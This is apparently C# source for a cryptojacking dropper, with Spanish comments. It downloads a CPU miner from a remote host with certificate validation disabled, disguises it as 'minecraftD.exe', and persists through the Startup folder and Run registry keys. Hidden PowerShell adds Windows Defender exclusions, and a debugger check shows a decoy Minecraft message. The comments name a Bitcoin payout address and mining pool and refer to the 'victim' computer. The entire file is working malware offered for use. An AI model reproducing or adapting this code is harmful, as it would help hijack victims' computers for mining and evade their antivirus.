using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

//Para hacer la descarga del mining
using System.Net;
//Para el process; ejecutando el archivo bat
using System.Diagnostics;
//Para validar si ya existen los archivos
using System.IO;
//Para DllImport; para el debuggerPresent
using System.Runtime.InteropServices;


namespace downloader
{
    class Downloader
    {
        /*
         * Se usa el programa CPUMiner-multi en su version para windows
         * https://github.com/tpruvot/cpuminer-multi/releases
         * v1.3.1
         * Bitcoin payment address -> 14SJbPSPtXucTcthxTzmCmQXSKatGpV7fQ
         * pool utilizada -> stratum+tcp://nya.kano.is:3333
         * de KanoPool http://www.kano.is/
         */
        static string remoteHost = "abpe.os";
        static string criptomining_file = "cpuminer-gw64-corei7.exe";
        static string bat_file = "cript.bat";
        static int remotePort = 8000;
        static string dest_file = "minecraftD.exe";
        static string bat_dest_file = "cript.bat";

        //Estas lineas sirven para revisar si es ejecutado por un debuggeador
        // Tomadas de https://www.codeproject.com/Articles/670193/Csharp-Detect-if-Debugger-is-Attached

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        
        static void download_File(string server_file, string dest_file)
        {
            /*
             *  Metodo para descargar un archivo en dest_file que es una
             *  ruta dentro de la computadora victima
             */
            // Descargas a traves de HTTPS
            UriBuilder myUri = new UriBuilder("https", remoteHost, remotePort, server_file);
            Uri uri_prueba = myUri.Uri;
            //Instancia para hacer la descarga
            WebClient webCli = new WebClient();
            //descarga del archivo a un archivo en la computadora
            webCli.DownloadFile(uri_prueba, @dest_file);
            //webCli.DownloadFile(uri_prueba, @"c:\\Windows\\serv2.txt");
        }

        static void downloaderM()
        {
            /*
             * Este metodo es el downloader en si. Establece una conexion cifrada para descargar
             * el criptominig y el archivo bat que ejecuta el criptomining descargado
             */

            // permite cualquier version del protocolo TLS
            // tomado de https://stackoverflow.com/questions/22251689/make-https-call-using-httpclient
            System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            // acepta el certificado invalido (self-signed)
            // tomado de https://stackoverflow.com/questions/12506575/how-to-ignore-the-certificate-check-when-ssl
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            
            // Descargamos el criptomining
            if (!File.Exists(Environment.GetEnvironmentVariable("windir") + "\\" + dest_file))
            {
                download_File(criptomining_file, Environment.GetEnvironmentVariable("windir") + "\\" + dest_file);
            }
            // Descargamos el archivo bat para ejecutar el criptomining
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + bat_dest_file))
            {
                //download_File(bat_file, Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file);

                // Descargamos el bat directo en la carpeta de startup, generando una opcion de persistencia
                download_File(bat_file, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + bat_dest_file);
                // Copiamos el archivo bat para con este crear la persistencia en las llaves de registro
                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + bat_dest_file, Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file, true);
            }
            // Ya que se necesitan los archivos para ser ejecutados, se decidio no hacer las
            // descargas en otro hilo

            
        }

        static void create_reg_keys()
        {
            /*
             * Metodo para crear las llaves de registro para la persistencia
             * del malware.
             * Se crean en LocalMachine y CurrentUser
             */

            //Obtenemos el comando dentro del archivo bat
            string bat_command = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\" + bat_dest_file);
            Microsoft.Win32.RegistryKey key;
            //Creamos la llave en LM
            key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //Asignamos una nueva entrada con el comando del archivo bat
            //al comando le quitamos el inicio "start "
            key.SetValue("minecraftD", bat_command);
            //Creamos la llave en CU
            key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //Asignamos una nueva entrada con el comando del archivo bat
            //al comando le quitamos el inicio "start "
            key.SetValue("minecraftD", bat_command);

            //Agregamos el criptomining a procesos excluidos de WDefender
            //key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\'Windows Defender'\\Exclusions\\Processes", true);
            //Asignamos una nueva entrada con el nombre del proceso de tipo dword
            //key.SetValue("minecraftD.exe", 0x00, Microsoft.Win32.RegistryValueKind.DWord);
        }

        static void pass_MDef()
        {
            /*
             * Metodo para agregar el criptomining a las exclusiones de
             * Windows Defender para pasar desapercibido
             */

            Process myProcess = new Process();

            // En esta parte excluimos el proceso minecraftD.exe
            myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.FileName = "powershell.exe";
            myProcess.StartInfo.Arguments = "-NonInteractive -Command \" Add-MpPreference -ExclusionProcess minecraftD.exe -Force\"";
            myProcess.StartInfo.CreateNoWindow = true;
            myProcess.Start();

            // En esta parte, se excluye el archivo de minecraftD.exe
            myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.FileName = "powershell.exe";
            myProcess.StartInfo.Arguments = "-NonInteractive -Command \" Add-MpPreference -ExclusionPath \"C:\\Windows\\minecraftD.exe\" -Force\"";
            myProcess.StartInfo.CreateNoWindow = true;
            myProcess.Start();
        }

        static void Main(string[] args)
        {
            //Microsoft.VisualStudio.
            // Atributo para hacer referencia al debugger
            bool isDebuggerPresent = false;
            // Se valida si es ejecutado por un debuggeador y se altera el valor del atributo
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);

            //Si es debuggeado, solo muestra un mensaje cualquiera
            if (isDebuggerPresent)
            {
                Console.WriteLine("Minecraft ya esta instalado en esta computadora :)");
            }
            // Si no es debuggeado, se ejecuta el downloader
            else
            {
                downloaderM();
                create_reg_keys();
                pass_MDef();
                // Ejecuta el archivo bat una vez descargado
                // Es necesario que el bat se encuentre en WINDIR, o poner ruta absoluta
                Process.Start(bat_dest_file);
            }
        }
    }
}
